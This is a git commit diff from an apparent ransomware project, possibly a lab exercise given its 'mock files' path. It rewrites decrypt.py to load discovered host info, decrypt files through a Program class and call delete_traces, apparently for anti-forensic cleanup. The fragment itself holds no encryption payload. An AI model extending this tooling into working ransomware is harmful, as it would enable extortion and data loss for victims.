4e009d53fe2e799d32ffc12bbef361cc2b31f70e
Elcris1 <eloicp10@gmail.com>
2025-12-04 19:54:17 +0100

    gitignore ignores ransomntoes and decrypt is modified to act as decryptor

--- decrypt.py
+++ decrypt.py
@@ -20,7 +20,23 @@ def decrypt_file(encrypted_filename, fernet: Fernet, decryption: bool = True):
 
 
 if __name__ == "__main__":
-    key = load_key()
-    fernet = Fernet(key)
-    decrypt_file("mock files/a.txt", "mock files/a.txt", fernet)
+    # key = load_key()
+    # fernet = Fernet(key)
+    # decrypt_file("mock files/a.txt", "mock files/a.txt", fernet)
+    
+    import platform
+    from main import Program
+    import json
+    import os
+    BASE = os.path.dirname(os.path.realpath(__file__))
+    path = os.path.join(BASE, "discovered_info.json")
 
+    with open(path, "r") as conf_file:
+        data = json.load(conf_file)
+        print(data)
+
+
+    program = Program(data=data, mode="auto", system=platform.system())
+    program.load_key()
+    program.decrypt()
+    program.delete_traces()
